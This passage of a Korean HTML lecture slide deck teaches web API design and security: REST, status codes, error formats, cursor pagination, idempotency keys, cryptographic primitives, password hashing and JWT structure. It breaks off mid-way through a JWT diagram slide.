@@ -1,0 +1,1075 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>7장 웹 API 설계와 보안</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+KR:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="assets/deck.css">
+</head>
+<body>
+<main class="deck" data-chapter="7" data-chapter-title="웹 API 설계와 보안">
+
+<!-- ===== Cover ======================================================== -->
+<section class="slide slide--cover">
+  <div class="cover">
+    <div class="cover__main">
+      <p class="cover__chapter"><b>7장</b> 웹 API 설계와 보안</p>
+      <h1>API는 약속이고, 보안은 그 약속을 지키는 일이다</h1>
+      <p class="cover__lede">좋은 API가 무엇을 약속하는지 설계 원칙으로 먼저 정리하고, 그 약속을 누가 호출할 수 있는지 토큰, 암호, 브라우저 정책으로 지키는 과정을 따라갑니다.</p>
+      <dl class="cover__meta">
+        <div><dt>선수 지식</dt><dd>2장 HTTP와 쿠키, 6장 필터와 DispatcherServlet</dd></div>
+        <div><dt>슬라이드</dt><dd>52장</dd></div>
+        <div><dt>예상 학습 시간</dt><dd>120분</dd></div>
+      </dl>
+    </div>
+    <div class="cover__map">
+      <p class="stackmap__cap">아래층부터 위로 쌓아 올라가는 순서입니다. 지금은 7단계입니다.</p>
+      <div class="stackmap" data-current="7"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 1부 기초 ===================================================== -->
+<section class="slide slide--divider" data-section="API 설계의 기초" data-depth="basic">
+  <p class="divider__no">1부</p>
+  <h2>API를 약속으로 설계하기</h2>
+  <p class="lede">6장에서 요청이 컨트롤러까지 오는 길을 봤습니다. 컨트롤러가 바깥에 내놓는 API는 앱과 다른 팀이 의존하는 공개 계약이라 한번 배포하면 바꾸기 어렵습니다. 그래서 "지금 동작하는가"보다 "예측 가능하고 오래 버티는가"를 기준으로 설계합니다.</p>
+</section>
+
+<section class="slide">
+  <h2>REST는 여섯 가지 제약 조건의 묶음이다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">제약 조건</th><th scope="col">뜻</th><th scope="col">얻는 것</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">Client-Server</th><td>화면과 데이터 처리를 분리</td><td>양쪽을 독립적으로 발전</td></tr>
+        <tr><th scope="row">Stateless</th><td class="is-flow">요청마다 필요한 정보를 모두 담음</td><td>아무 서버나 처리 가능, 확장 쉬움</td></tr>
+        <tr><th scope="row">Cacheable</th><td>응답에 캐시 가능 여부를 표시</td><td>중간 계층이 응답 재사용</td></tr>
+        <tr><th scope="row">Uniform Interface</th><td class="is-flow">리소스를 URI로, 조작은 표준 메서드로</td><td>누구나 같은 방식으로 호출</td></tr>
+        <tr><th scope="row">Layered System</th><td>중간에 프록시, 게이트웨이를 끼울 수 있음</td><td>보안, 캐시 계층 추가</td></tr>
+        <tr><th scope="row">Code-on-Demand</th><td>서버가 실행 코드를 내려줌(선택)</td><td>클라이언트 기능 확장</td></tr>
+      </tbody>
+    </table>
+    <p class="small"><dfn>REST</dfn>(Representational State Transfer)는 2000년 Roy Fielding의 박사 논문에서 정의한 아키텍처 스타일로, 표준이 아니라 제약 조건의 묶음입니다. 실무에서 "RESTful하다"는 말은 대개 Stateless와 Uniform Interface를 지킨다는 뜻입니다. 링크로 다음 동작을 안내하는 HATEOAS까지 지키는 API는 드뭅니다.</p>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>URI는 명사로, 동작은 메서드로 말한다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="URI 설계"><code><span class="c"># 피해야 할 모양: 동사가 URI에 들어감</span>
+<span class="dim">POST /getOrders</span>
+<span class="dim">POST /createOrder</span>
+<span class="dim">GET  /deleteOrder?id=42</span>
+
+<span class="c"># 리소스 중심: 명사(복수형) + 메서드</span>
+GET    /orders            <span class="c"># 목록</span>
+POST   /orders            <span class="c"># 생성</span>
+GET    /orders/42         <span class="c"># 단건</span>
+PATCH  /orders/42         <span class="c"># 일부 수정</span>
+DELETE /orders/42         <span class="c"># 삭제</span>
+<span class="hl">GET    /users/7/orders    <span class="c"># 소속 관계</span></span>
+GET    /orders?status=PAID&amp;sort=-createdAt</code></pre>
+    <div class="prose">
+      <p>URI는 <dfn>리소스</dfn>(자원)의 이름이고, 무엇을 할지는 HTTP 메서드가 정합니다. 그래야 캐시와 프록시가 2장에서 본 메서드의 안전성, 멱등성을 믿고 활용합니다.</p>
+      <p>필터와 정렬은 쿼리 문자열에 둡니다. "주문 취소"처럼 CRUD로 안 떨어지는 동작은 상태 변화로 봅니다. 상태값만 바뀌면 <code>PATCH</code>로, 사유와 환불 기록이 남으면 <code>POST /orders/42/cancellation</code>처럼 하위 리소스로 만듭니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>상태 코드는 클라이언트의 다음 행동을 정한다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">상황</th><th scope="col">코드</th><th scope="col">클라이언트가 할 일</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">리소스 생성 성공</th><td class="num">201 + Location</td><td>새 리소스 주소로 이동</td></tr>
+        <tr><th scope="row">본문 형식이 틀림</th><td class="num">400</td><td>요청을 고쳐서 재전송</td></tr>
+        <tr><th scope="row">형식은 맞지만 규칙 위반</th><td class="num">422</td><td>입력값을 사용자에게 다시 받음</td></tr>
+        <tr><th scope="row">상태 충돌(중복, 버전)</th><td class="num">409</td><td>최신 상태를 다시 읽고 판단</td></tr>
+        <tr><th scope="row">요청이 너무 많음</th><td class="num">429</td><td>Retry-After만큼 기다림(8장)</td></tr>
+        <tr><th scope="row">서버 오류</th><td class="num is-key">500 / 503</td><td>멱등 요청만 재시도</td></tr>
+      </tbody>
+    </table>
+    <p class="small">"모든 응답을 200으로 주고 본문에 실패 코드를 담는" 방식은 모니터링, 재시도, 캐시가 응답을 오해하게 만듭니다. 401과 403의 구분은 뒤에서 인증과 함께 봅니다.</p>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>에러 응답은 표준 포맷 하나로 통일한다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="HTTP 응답"><code>HTTP/1.1 422 Unprocessable Content
+<span class="hl">Content-Type: application/problem+json</span>
+
+{
+  <span class="s">"type"</span>: <span class="s">"https://api.example.com/errors/stock"</span>,
+  <span class="s">"title"</span>: <span class="s">"재고가 부족합니다"</span>,
+  <span class="s">"status"</span>: <span class="n">422</span>,
+  <span class="s">"detail"</span>: <span class="s">"상품 381의 재고는 2개입니다"</span>,
+  <span class="s">"instance"</span>: <span class="s">"/orders/req-9f2c"</span>,
+  <span class="s">"code"</span>: <span class="s">"OUT_OF_STOCK"</span>
+}</code></pre>
+    <div class="prose">
+      <p>엔드포인트마다 에러 모양이 다르면 클라이언트는 분기 코드를 끝없이 늘려야 합니다. <dfn title="RFC 9457">Problem Details</dfn>는 이를 위한 IETF 표준으로, 2023년 RFC 7807을 대체했습니다.</p>
+      <p><code>type</code>은 에러 종류의 식별자, <code>detail</code>은 사람이 읽을 설명입니다. <code>code</code>처럼 필요한 필드는 확장해도 됩니다. Spring 6의 <code>ProblemDetail</code> 클래스가 이 형식을 그대로 지원합니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>인증은 누구인지, 인가는 무엇을 해도 되는지</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p><dfn title="Authentication">인증</dfn>은 요청한 주체가 누구인지 확인하는 일입니다. 비밀번호, 토큰, 인증서가 그 수단입니다. <dfn title="Authorization">인가</dfn>는 확인된 주체가 이 리소스에 이 동작을 해도 되는지 판단하는 일입니다.</p>
+      <p>순서는 항상 인증이 먼저입니다. 누구인지 모르면 권한을 따질 수 없기 때문입니다.</p>
+    </div>
+    <table class="compare">
+      <thead><tr><th scope="col">상황</th><th scope="col">코드</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">토큰이 없거나 만료됨</th><td class="is-flow">401 Unauthorized</td></tr>
+        <tr><th scope="row">로그인했지만 권한 없음</th><td class="is-flow">403 Forbidden</td></tr>
+        <tr><th scope="row">남의 주문 존재를 숨김</th><td>404 Not Found</td></tr>
+      </tbody>
+      <caption>401은 이름과 달리 "인증 실패"이며, 응답에 WWW-Authenticate 헤더를 실어야 합니다(RFC 9110).</caption>
+    </table>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>세션은 서버가 기억하고, 토큰은 요청이 증명한다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">항목</th><th scope="col">세션 기반</th><th scope="col">토큰(JWT) 기반</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">상태 저장 위치</th><td>서버 메모리나 Redis</td><td>토큰 자체(클라이언트)</td></tr>
+        <tr><th scope="row">요청 검증</th><td>세션 ID로 저장소 조회</td><td class="is-flow">서명만 검증, 조회 불필요</td></tr>
+        <tr><th scope="row">서버 확장</th><td>세션 공유 필요(8장)</td><td class="is-flow">어느 서버든 검증 가능</td></tr>
+        <tr><th scope="row">즉시 무효화</th><td class="is-flow">세션 삭제로 끝</td><td class="is-key">만료 전까지 유효</td></tr>
+        <tr><th scope="row">크기</th><td>세션 ID 수십 바이트</td><td>클레임에 따라 수백 바이트 이상</td></tr>
+      </tbody>
+    </table>
+    <p class="small">쿠키와 세션 ID의 동작 방식은 2장에서 봤습니다. 둘 중 무엇이 더 낫다기보다, "상태를 어디에 둘 것인가"의 선택이며 각자의 약점을 보완하는 장치가 뒤따릅니다.</p>
+  </div>
+</section>
+
+<!-- ===== 2부 원리: 페이지네이션과 멱등성 =============================== -->
+<section class="slide slide--divider" data-section="페이지네이션과 멱등성" data-depth="core">
+  <p class="divider__no">2부</p>
+  <h2>데이터가 움직여도, 요청이 반복돼도 맞아야 한다</h2>
+  <p class="lede">목록은 조회하는 사이에도 바뀌고, 네트워크는 응답을 잃어버립니다. 이런 조건에서도 결과가 틀리지 않게 만드는 두 가지 설계를 봅니다.</p>
+  <div class="depth-shift" aria-label="깊이 전환: 기초에서 원리로">
+    <span class="depth-shift__step"><span class="depth" data-depth="basic"><span class="depth__ticks" aria-hidden="true"><i></i><i></i><i></i></span></span>기초</span>
+    <span class="depth-shift__line" aria-hidden="true"></span>
+    <span class="depth-shift__step is-to"><span class="depth" data-depth="core"><span class="depth__ticks" aria-hidden="true"><i></i><i></i><i></i></span></span>원리</span>
+    <span class="depth-shift__note">여기부터는 DB 쿼리와 서버 저장소 수준에서 왜 그렇게 동작하는지 봅니다.</span>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>offset 페이지네이션은 밀리고 느려진다</h2>
+  <div class="split split--center">
+    <div class="prose">
+      <p><code>LIMIT 5 OFFSET 5</code>는 "앞의 5개를 건너뛰라"는 뜻입니다. 사용자가 1페이지를 보는 사이 새 글이 하나 들어오면 모든 행이 한 칸씩 밀려, 2페이지 첫 줄에 <mark>이미 본 글이 다시 나옵니다</mark>. 삭제가 일어나면 반대로 한 건을 놓칩니다.</p>
+      <p>성능도 문제입니다. DB는 건너뛸 행을 실제로 읽고 버리므로 <code>OFFSET 1000000</code>은 백만 행을 읽습니다(4장 인덱스 참고).</p>
+    </div>
+    <figure class="figure">
+      <svg class="dg" viewBox="0 0 760 520" role="img" aria-labelledby="f-offset-t">
+        <title id="f-offset-t">1페이지 조회 후 새 글 11이 추가되면 2페이지의 OFFSET 5 위치가 한 칸 밀려 글 6이 중복으로 보인다.</title>
+        <text class="dg-label--sm" x="230" y="28" text-anchor="middle">1페이지 요청 시점</text>
+        <text class="dg-label--sm" x="550" y="28" text-anchor="middle">2페이지 요청 시점</text>
+        <!-- col 1 -->
+        <rect class="dg-box dg-box--flow" x="150" y="50" width="160" height="34"/><text x="230" y="67" text-anchor="middle">글 10</text>
+        <rect class="dg-box dg-box--flow" x="150" y="90" width="160" height="34"/><text x="230" y="107" text-anchor="middle">글 9</text>
+        <rect class="dg-box dg-box--flow" x="150" y="130" width="160" height="34"/><text x="230" y="147" text-anchor="middle">글 8</text>
+        <rect class="dg-box dg-box--flow" x="150" y="170" width="160" height="34"/><text x="230" y="187" text-anchor="middle">글 7</text>
+        <rect class="dg-box dg-box--flow" x="150" y="210" width="160" height="34"/><text x="230" y="227" text-anchor="middle">글 6</text>
+        <rect class="dg-box dg-box--muted" x="150" y="262" width="160" height="34"/><text class="dg-label--muted" x="230" y="279" text-anchor="middle">글 5</text>
+        <rect class="dg-box dg-box--muted" x="150" y="302" width="160" height="34"/><text class="dg-label--muted" x="230" y="319" text-anchor="middle">글 4</text>
+        <rect class="dg-box dg-box--muted" x="150" y="342" width="160" height="34"/><text class="dg-label--muted" x="230" y="359" text-anchor="middle">글 3</text>
+        <rect class="dg-box dg-box--muted" x="150" y="382" width="160" height="34"/><text class="dg-label--muted" x="230" y="399" text-anchor="middle">글 2</text>
+        <rect class="dg-box dg-box--muted" x="150" y="422" width="160" height="34"/><text class="dg-label--muted" x="230" y="439" text-anchor="middle">글 1</text>
+        <!-- col 2 -->
+        <rect class="dg-box dg-box--ghost" x="470" y="50" width="160" height="34"/><text class="dg-label--flow" x="550" y="67" text-anchor="middle">글 11 (새 글)</text>
+        <rect class="dg-box dg-box--muted" x="470" y="90" width="160" height="34"/><text class="dg-label--muted" x="550" y="107" text-anchor="middle">글 10</text>
+        <rect class="dg-box dg-box--muted" x="470" y="130" width="160" height="34"/><text class="dg-label--muted" x="550" y="147" text-anchor="middle">글 9</text>
+        <rect class="dg-box dg-box--muted" x="470" y="170" width="160" height="34"/><text class="dg-label--muted" x="550" y="187" text-anchor="middle">글 8</text>
+        <rect class="dg-box dg-box--muted" x="470" y="210" width="160" height="34"/><text class="dg-label--muted" x="550" y="227" text-anchor="middle">글 7</text>
+        <rect class="dg-box dg-box--key" x="470" y="262" width="160" height="34"/><text class="dg-label--key" x="550" y="279" text-anchor="middle">글 6 (중복)</text>
+        <rect class="dg-box dg-box--flow" x="470" y="302" width="160" height="34"/><text x="550" y="319" text-anchor="middle">글 5</text>
+        <rect class="dg-box dg-box--flow" x="470" y="342" width="160" height="34"/><text x="550" y="359" text-anchor="middle">글 4</text>
+        <rect class="dg-box dg-box--flow" x="470" y="382" width="160" height="34"/><text x="550" y="399" text-anchor="middle">글 3</text>
+        <rect class="dg-box dg-box--flow" x="470" y="422" width="160" height="34"/><text x="550" y="439" text-anchor="middle">글 2</text>
+        <!-- offset boundary -->
+        <line class="dg-line dg-line--thin" x1="20" y1="253" x2="740" y2="253"/>
+        <text class="dg-label--sm" x="20" y="150" text-anchor="start">OFFSET 0</text>
+        <text class="dg-label--sm" x="20" y="360" text-anchor="start">OFFSET 5</text>
+        <text class="dg-label--muted" x="390" y="490" text-anchor="middle">파란 칸이 각 시점에 사용자에게 보인 5건</text>
+      </svg>
+    </figure>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>cursor는 "어디서부터"를 값으로 기억한다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="SQL"><code><span class="c">-- offset: 앞의 N행을 읽고 버림</span>
+<span class="dim">SELECT * FROM post</span>
+<span class="dim">ORDER BY created_at DESC, id DESC</span>
+<span class="dim">LIMIT 20 OFFSET 100000;</span>
+
+<span class="c">-- cursor: 마지막으로 본 행 다음부터</span>
+SELECT * FROM post
+<span class="hl">WHERE (created_at, id) &lt; (:lastAt, :lastId)</span>
+ORDER BY created_at DESC, id DESC
+LIMIT 20;
+
+<span class="c">-- 인덱스: (created_at, id)</span></code></pre>
+    <div class="prose">
+      <p><dfn>cursor 페이지네이션</dfn>은 마지막으로 본 행의 정렬 키를 기준점으로 넘깁니다. 인덱스에서 그 지점을 바로 찾아 20건만 읽으므로 몇 번째 페이지든 속도가 같고, 중간에 행이 추가돼도 밀리지 않습니다.</p>
+      <p><code>created_at</code>이 같은 행이 있을 수 있어 <code>id</code>를 함께 써서 순서를 유일하게 만듭니다. 응답에는 이 값을 Base64로 감싼 불투명한 <code>nextCursor</code>를 줍니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>두 방식은 화면 요구사항으로 고른다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">항목</th><th scope="col">offset</th><th scope="col">cursor</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">임의 페이지 이동</th><td class="is-flow">가능(7페이지로 점프)</td><td>불가, 앞뒤로만 이동</td></tr>
+        <tr><th scope="row">깊은 페이지 성능</th><td class="is-key">갈수록 느려짐</td><td class="is-flow">일정함</td></tr>
+        <tr><th scope="row">데이터 변경 중 정확성</th><td>중복이나 누락 발생</td><td>밀리지 않음</td></tr>
+        <tr><th scope="row">정렬 조건</th><td>자유로움</td><td>인덱스와 맞는 유일한 키 필요</td></tr>
+        <tr><th scope="row">어울리는 화면</th><td>관리자 표, 검색 결과 페이지</td><td>무한 스크롤, 피드, 동기화 API</td></tr>
+      </tbody>
+    </table>
+    <aside class="callout callout--note">
+      <p>전체 개수(<code>COUNT(*)</code>)도 큰 테이블에서는 비쌉니다. 무한 스크롤이라면 개수 대신 <code>hasNext</code>만 주는 편이 낫습니다.</p>
+    </aside>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>응답을 잃어버린 재시도가 결제를 두 번 한다</h2>
+  <div class="split split--wide-left">
+    <div class="seq" role="img" aria-label="클라이언트가 결제를 요청하고 서버는 결제를 처리했지만 응답이 유실되어 클라이언트가 재시도하자 결제가 두 번 일어난다">
+      <div class="seq__head"><span>클라이언트</span><span></span><span>결제 서버</span></div>
+      <div class="seq__row seq__row--r">
+        <span class="seq__state"></span>
+        <span class="seq__msg"><b>POST /payments</b> 10,000원</span>
+        <span class="seq__state">카드 승인</span>
+      </div>
+      <div class="seq__row seq__row--l is-key is-back">
+        <span class="seq__state is-key">타임아웃</span>
+        <span class="seq__msg"><b>201 Created</b><small>응답이 네트워크에서 유실됨</small></span>
+        <span class="seq__state"></span>
+      </div>
+      <div class="seq__row seq__row--r is-key">
+        <span class="seq__state"></span>
+        <span class="seq__msg"><b>POST /payments</b> 재시도</span>
+        <span class="seq__state is-key">또 승인</span>
+      </div>
+      <div class="seq__row seq__row--note">
+        <span></span><span class="seq__msg"><span>사용자는 20,000원이 빠져나감</span></span><span></span>
+      </div>
+    </div>
+    <div class="prose">
+      <p>클라이언트 입장에서 타임아웃은 "실패"가 아니라 <strong>"결과를 모름"</strong>입니다. 서버가 처리했는지 알 수 없으니 재시도하고 싶지만, <code>POST</code>는 멱등이 아니라서(2장) 같은 요청이 새 결제를 또 만듭니다.</p>
+      <p>그렇다면 POST도 안전하게 재시도할 수 있게 만들 방법이 필요합니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>Idempotency-Key로 같은 요청임을 알린다</h2>
+  <div class="split split--even">
+    <ol class="steps">
+      <li><b>키 생성</b><p>클라이언트가 결제 시도마다 UUID를 만들어 헤더에 싣습니다.</p></li>
+      <li><b>키 선점</b><p>서버가 키를 "처리 중"으로 원자적으로 저장한 뒤 결제를 실행합니다.</p></li>
+      <li><b>결과 저장</b><p>상태 코드와 응답 본문을 키에 붙여 저장합니다.</p></li>
+      <li class="is-key"><b>같은 키 재요청</b><p>다시 실행하지 않고 저장된 응답을 그대로 돌려줍니다.</p></li>
+      <li><b>예외 응답</b><p>처리 중이면 409, 같은 키에 다른 본문이면 422로 거절합니다.</p></li>
+    </ol>
+    <div class="prose">
+      <p>핵심은 <mark>재시도 여부를 서버가 판단할 수 있게 요청에 정체성을 붙이는 것</mark>입니다. 키가 같으면 같은 의도이므로 결과도 같아야 합니다.</p>
+      <p>이 방식은 Stripe 같은 결제 API가 먼저 썼고, 지금은 IETF에서 <code>Idempotency-Key</code> 헤더 표준 초안으로 정리되고 있습니다. 409, 422 응답도 그 초안의 권고입니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>키 저장은 원자적으로, 보관은 기한을 두고</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="schema.sql"><code>CREATE TABLE idempotency_key (
+  <span class="k">key</span>          VARCHAR(64),
+  user_id      BIGINT,
+  request_hash CHAR(64),   <span class="c">-- 본문 SHA-256</span>
+  status       VARCHAR(16),<span class="c">-- PROCESSING/DONE</span>
+  response     JSON,
+  created_at   TIMESTAMP,
+<span class="hl">  PRIMARY KEY (user_id, <span class="k">key</span>)</span>
+);
+<span class="c">-- INSERT 성공한 요청만 결제를 실행</span>
+<span class="c">-- 중복 INSERT는 키 위반으로 즉시 실패</span></code></pre>
+    <div class="prose">
+      <p>"조회 후 없으면 저장"은 두 요청이 동시에 조회를 통과하는 경쟁 상태를 만듭니다. 그래서 유니크 제약 INSERT나 Redis <code>SET NX</code>(8장)로 <strong>선점 자체를 한 번에</strong> 합니다.</p>
+      <p>키는 사용자 단위로 범위를 나누고, 본문 해시로 오용을 막습니다. Stripe는 24시간이 지난 키를 정리합니다. 재시도가 일어날 만한 기간만 보관하면 충분합니다.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 3부 원리: 암호 기법 ============================================ -->
+<section class="slide slide--divider" data-section="암호 기법의 원리" data-depth="core">
+  <p class="divider__no">3부</p>
+  <h2>토큰과 비밀번호를 지키는 암호 도구들</h2>
+  <p class="lede">2장에서는 TLS가 암호 기법을 어떻게 조합해 쓰는지 봤습니다. 여기서는 그 도구 하나하나가 무엇을 보장하고 무엇을 보장하지 않는지 원리로 정리합니다. 뒤의 JWT와 비밀번호 저장이 모두 이 위에 서 있습니다.</p>
+</section>
+
+<section class="slide">
+  <h2>대칭키는 빠르고, 비대칭키는 키를 나눠 준다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">항목</th><th scope="col">대칭키</th><th scope="col">비대칭키(공개키)</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">키</th><td>암호화와 복호화에 같은 키</td><td>공개키와 개인키 한 쌍</td></tr>
+        <tr><th scope="row">대표 알고리즘</th><td>AES, ChaCha20</td><td>RSA, ECDSA, ECDH</td></tr>
+        <tr><th scope="row">속도</th><td class="is-flow">빠름, 대용량에 적합</td><td>수백 배 이상 느림</td></tr>
+        <tr><th scope="row">약점</th><td class="is-key">키를 안전하게 전달하기 어려움</td><td>느려서 큰 데이터에 부적합</td></tr>
+        <tr><th scope="row">주된 용도</th><td>실제 데이터 암호화</td><td class="is-flow">키 교환, 전자 서명</td></tr>
+      </tbody>
+    </table>
+    <div class="prose">
+      <p>대칭키의 약점은 "처음 만난 상대와 어떻게 키를 나누는가"이고, 비대칭키는 공개키를 마음껏 뿌려도 개인키 없이는 풀 수 없어 이 문제를 풉니다. 2장의 TLS가 <strong>비대칭으로 대칭키를 합의하고, 데이터는 대칭으로</strong> 암호화한 이유가 바로 이것입니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>해시, MAC, 서명은 보장하는 범위가 다르다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">도구</th><th scope="col">만드는 방법</th><th scope="col">보장</th><th scope="col">보장하지 않음</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">해시</th><td>SHA-256(데이터)</td><td>변조 탐지(값 비교 시)</td><td>누가 만들었는지</td></tr>
+        <tr><th scope="row">MAC</th><td>HMAC(공유 비밀키, 데이터)</td><td class="is-flow">무결성 + 키 가진 쪽이 만듦</td><td>둘 중 누가 만들었는지</td></tr>
+        <tr><th scope="row">전자 서명</th><td>개인키로 해시에 서명</td><td class="is-flow">무결성 + 서명자 증명</td><td>내용 비밀 유지</td></tr>
+        <tr><th scope="row">암호화</th><td>AES, RSA 등</td><td>내용 비밀 유지</td><td class="is-key">그 자체로는 무결성</td></tr>
+      </tbody>
+    </table>
+    <div class="prose">
+      <p><dfn title="cryptographic hash">해시</dfn>는 입력이 1비트만 바뀌어도 결과가 완전히 달라지고, 결과에서 입력을 되돌릴 수 없는 단방향 함수입니다. 하지만 누구나 계산할 수 있으므로 공격자가 데이터를 바꾸고 해시도 다시 계산하면 그만입니다. 그래서 <mark>비밀키를 섞은 MAC</mark>이나 <mark>개인키로 만든 서명</mark>이 필요합니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>비밀번호는 암호화하지 않고 느리게 해시한다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p>비밀번호를 암호화해 저장하면 키가 유출되는 순간 전부 복호화됩니다. 서버는 원래 비밀번호를 알 필요가 없고 "같은지"만 확인하면 되므로, 되돌릴 수 없는 해시가 맞습니다.</p>
+      <p>그런데 SHA-256만으로는 부족합니다. 빠르게 만든 함수라 GPU 한 장으로 초당 수십억 개의 후보를 시험할 수 있고, 같은 비밀번호는 같은 해시가 되어 미리 계산한 <dfn title="rainbow table">레인보우 테이블</dfn>로 한 번에 풀립니다.</p>
+    </div>
+    <div class="prose">
+      <p>그래서 두 가지를 더합니다.</p>
+      <ul>
+        <li><strong>솔트(Salt)</strong>: 사용자마다 다른 무작위 값을 섞어, 같은 비밀번호도 다른 해시가 되게 합니다. 미리 계산한 표가 쓸모없어집니다.</li>
+        <li><strong>키 스트레칭(Key Stretching)</strong>: 해시를 수천~수만 번 반복하거나 메모리를 많이 쓰게 해서 <mark>한 번 시도하는 비용</mark>을 일부러 키웁니다.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>bcrypt와 Argon2는 솔트와 비용을 내장한다</h2>
+  <div class="split split--wide-left">
+    <div class="slide__body">
+      <pre class="code" data-file="bcrypt 해시 문자열"><code><span class="hl">$2a$<span class="n">10</span>$N9qo8uLOickgx2ZMRZoMye</span>
+<span class="dim">IjZAgcfl7p92ldGxad68LJZdL17lhWy</span>  <span class="c"># 한 줄</span>
+<span class="c"># 2a: 알고리즘  10: cost(2^10 반복)</span>
+<span class="c"># 다음 22자: 솔트  나머지 31자: 해시값</span></code></pre>
+      <table class="compare">
+        <thead><tr><th scope="col">알고리즘</th><th scope="col">OWASP 최소 권장</th></tr></thead>
+        <tbody>
+          <tr><th scope="row">Argon2id</th><td class="is-flow">메모리 19MiB, 반복 2, 병렬 1</td></tr>
+          <tr><th scope="row">scrypt</th><td>N=2^17, r=8, p=1</td></tr>
+          <tr><th scope="row">bcrypt</th><td>cost 10 이상, 입력 72바이트 제한</td></tr>
+          <tr><th scope="row">PBKDF2</th><td>HMAC-SHA-256, 60만 회(FIPS 필요 시)</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="prose">
+      <p>bcrypt는 솔트와 cost를 결과 문자열에 함께 저장합니다. 그래서 별도 솔트 컬럼이 필요 없고, 나중에 cost를 올려도 기존 해시를 검증할 수 있습니다.</p>
+      <p>Argon2id는 연산과 함께 <strong>메모리를 많이 요구</strong>해 GPU 병렬 공격에 더 강합니다. Spring Security의 <code>BCryptPasswordEncoder</code> 기본 cost는 10입니다.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 4부 원리: 토큰 인증 =========================================== -->
+<section class="slide slide--divider" data-section="JWT와 OAuth" data-depth="core">
+  <p class="divider__no">4부</p>
+  <h2>토큰은 어떻게 스스로를 증명하는가</h2>
+  <p class="lede">1부에서 토큰 방식은 "요청이 스스로 증명한다"고 했습니다. 그 증명이 서명으로 어떻게 만들어지는지, 만료와 무효화의 빈틈을 어떻게 메우는지, 다른 서비스에 권한을 맡기는 OAuth가 어떻게 동작하는지 봅니다.</p>
+</section>
+
+<section class="slide">
+  <h2>JWT는 점으로 이은 세 조각이다</h2>
+  <div class="slide__body">
+    <figure class="figure">
+      <svg class="dg" viewBox="0 0 1400 340" role="img" aria-labelledby="f-jwt-t">
+        <title id="f-jwt-t">JWT는 Header, Payload, Signature 세 부분을 점으로 이은 문자열이며, 서명은 앞의 두 부분을 대상으로 만든다.</title>
+        <rect class="dg-box" x="40" y="40" width="380" height="64"/>
+        <text class="dg-mono" x="230" y="72" text-anchor="middle">eyJhbGciOiJSUzI1NiJ9</text>
+        <text class="dg-label--lg" x="440" y="80" text-anchor="middle">.</text>
+        <rect class="dg-box dg-box--flow" x="460" y="40" width="440" height="64"/>
+        <text class="dg-mono" x="680" y="72" text-anchor="middle">eyJzdWIiOiI0MiIsImV4cCI6MTc2...</text>
+        <text class="dg-label--lg" x="920" y="80" text-anchor="middle">.</text>
+        <rect class="dg-box dg-box--solid" x="940" y="40" width="420" height="64"/>
+        <text class="dg-mono dg-label--on" x="1150" y="72" text-anchor="middle">SflKxwRJSMeKKF2QT4fwpM...</text>
+        <text class="dg-label--lg" x="230" y="150" text-anchor="middle">Header</text>
+        <text class="dg-mono" x="230" y="184" text-anchor="middle">{"alg":"RS256",</text>
+        <text class="dg-mono" x="230" y="210" text-anchor="middle">"typ":"JWT","kid":"k1"}</text>
+        <text class="dg-label--lg" x="680" y="150" text-anchor="middle">Payload (클레임)</text>
+        <text class="dg-mono" x="680" y="184" text-anchor="middle">{"sub":"42","role":"USER",</text>
+        <text class="dg-mono" x="680" y="210" text-anchor="middle">"iat":1763100000,"exp":1763100900}</text>
+        <text class="dg-label--lg" x="1150" y="150" text-anchor="middle">Signature</text>
+        <text x="1150" y="184" text-anchor="middle">Header와 Payload를</text>
+        <text x="1150" y="210" text-anchor="middle">개인키로 서명한 값</text>
+        <path class="dg-arrow dg-arrow--flow" d="M230,232 V270 Q230,296 256,296 H1124 Q1150,296 1150,270 V226"/>
+        <rect class="dg-fill-paper" x="560" y="280" width="280" height="32"/>
